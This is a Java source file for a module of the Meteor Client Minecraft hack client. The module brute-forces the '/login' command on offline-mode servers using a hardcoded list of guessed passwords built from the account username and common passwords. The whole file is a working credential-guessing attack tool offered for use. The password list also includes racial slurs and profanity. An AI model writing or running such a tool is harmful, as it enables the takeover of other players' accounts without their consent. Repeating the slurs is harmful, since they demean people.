package com.crystaldevs.crystal.modules.misc;

import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;

import java.util.ArrayList;
import java.util.List;

public class CrackedBruteforce extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
            .name("delay")
            .description("Delay between passwords (in ms).")
            .defaultValue(1000)
            .min(1)
            .sliderMax(5000)
            .build()
    );

    private final List<String> passwords = new ArrayList<>();
    private Thread thread = null;

    public CrackedBruteforce() {
        super(Categories.Misc, "cracked-bruteforcer", "CRYSTAL || Attempts to bruteforce the login on cracked servers.");

        String username = mc.getSession().getUsername();
        passwords.add(username);
        passwords.add(username + "1");
        passwords.add(username + "12");
        passwords.add(username + "123");
        passwords.add(username + "12345");
        passwords.add(username + "123456");
        passwords.add(username + "1234567");
        passwords.add("password");
        passwords.add("password123");
        passwords.add(username + "password");
        passwords.add(username + "_password");
        passwords.add(username + "_");
        passwords.add("qwerty");
        passwords.add("123456");
        passwords.add("123");
        passwords.add(username + "@");
        passwords.add(username + "@1");
        passwords.add(username.toLowerCase());
        passwords.add(username.toUpperCase());
        passwords.add("1234");
        passwords.add("qwertyuiop");
        passwords.add("123456789");
        passwords.add("PASSWORD");
        passwords.add("nigger");
        passwords.add("nigger123");
        passwords.add("000000");
        passwords.add("123123");
        passwords.add("_" + username);
        passwords.add("fuckyou");
        passwords.add("fuckyou".toUpperCase());
        passwords.add("1q2w3e4r5t");
        passwords.add("password1");
        passwords.add("222222");
        passwords.add("qwerty123");
        passwords.add("computer");
        passwords.add("7777777");
        passwords.add("football");
        passwords.add("6b6t");
        passwords.add("8b8t");
        passwords.add("popbob");
        passwords.add("2b2t");
        passwords.add("stash");
        passwords.add(username + "_qwerty");
        passwords.add("__" + username);
        passwords.add(username + "__");
        passwords.add("1" + username);
        passwords.add("12" + username);
        passwords.add("123" + username);
        passwords.add("anarchy");
        passwords.add("dupe");
        passwords.add("glock");
        passwords.add("scam");
        passwords.add("getoutofmyaccount");
    }

    @Override
    public void onActivate() {
        thread = new Thread(this::bruteforce);
        thread.start();
    }

    @Override
    public void onDeactivate() {
        if (thread != null && thread.isAlive()) thread.stop();
    }

    public void bruteforce() {
        for (String pw : passwords) {
            mc.player.networkHandler.sendChatCommand("login " + pw);
            try {
                Thread.sleep(delay.get().longValue());
            } catch (InterruptedException ignored) {
            }
        }
    }

    @EventHandler
    public void onGameLeft() {
        toggle();
    }
}